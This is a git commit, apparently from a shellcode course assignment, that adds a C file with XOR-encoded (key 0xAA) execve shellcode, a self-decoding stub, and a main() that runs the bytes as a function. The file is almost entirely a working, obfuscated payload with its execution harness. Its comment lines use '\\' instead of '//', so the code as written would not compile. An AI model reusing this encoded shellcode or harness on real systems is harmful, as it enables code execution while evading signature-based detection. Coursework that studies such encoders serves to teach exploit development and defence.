ea13e36ec7b828cbe08b170121b0c9982a856efe
jstigerwalt <johnstigerwalt@live.com>
2017-12-04 16:59:38 -0500

    Create xor-decoder-shellcode.c

---
+++ Assignments/Assignment-4/XOR-Encoder/xor-decoder-shellcode.c
@@ -0,0 +1,14 @@
+#include<stdio.h>
+
+\\ xor encoded shellcode with key: "0xAA"
+\\ execve shellcode used
+
+unsigned char shellcode[] = \
+"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\xaa";
+
+main()
+{
+	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
+	int (*ret)() = (int(*)())shellcode;
+	ret();
+}
